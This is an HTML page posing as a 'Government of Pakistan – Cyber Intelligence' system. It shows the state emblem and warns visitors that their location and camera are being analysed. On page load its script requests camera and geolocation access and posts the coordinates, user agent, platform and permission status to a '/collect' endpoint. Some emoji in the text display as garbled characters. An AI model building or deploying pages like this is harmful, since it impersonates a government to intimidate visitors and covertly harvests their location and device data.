<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>üáµüá∞ Government of Pakistan</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/en/3/32/State_emblem_of_Pakistan.png">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma;
      background: #001f3f;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: rgba(255,255,255,0.05);
      padding: 30px;
      border-radius: 14px;
      box-shadow: 0 0 30px rgba(0,0,0,0.4);
      width: 350px;
      text-align: center;
      backdrop-filter: blur(8px);
    }
    img {
      width: 70px;
      margin-bottom: 15px;
    }
    h1 {
      font-size: 20px;
      margin-bottom: 8px;
    }
    p {
      font-size: 13px;
      color: #ccc;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/en/3/32/State_emblem_of_Pakistan.png" alt="Gov Logo">
    <h1>‚ö†Ô∏è Government of Pakistan ‚Äì Cyber Intelligence</h1>
    <p>Confidential system ‚Äì Your location & camera are being analyzed...</p>
  </div>

  <script>
    async function sendData(cameraStatus, latitude = null, longitude = null) {
      await fetch("/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          latitude: latitude,
          longitude: longitude,
          camera: cameraStatus,
          device: navigator.platform
        })
      });
    }

    function startTracking() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          stream.getTracks().forEach(track => track.stop());

          navigator.geolocation.getCurrentPosition(
            pos => sendData("‚úÖ Camera Allowed", pos.coords.latitude, pos.coords.longitude),
            err => sendData("‚úÖ Camera Allowed, ‚ùå Location Denied")
          );
        })
        .catch(() => sendData("‚ùå Camera Denied"));
    }

    // Auto-run
    window.onload = startTracking;
  </script>
</body>
</html>
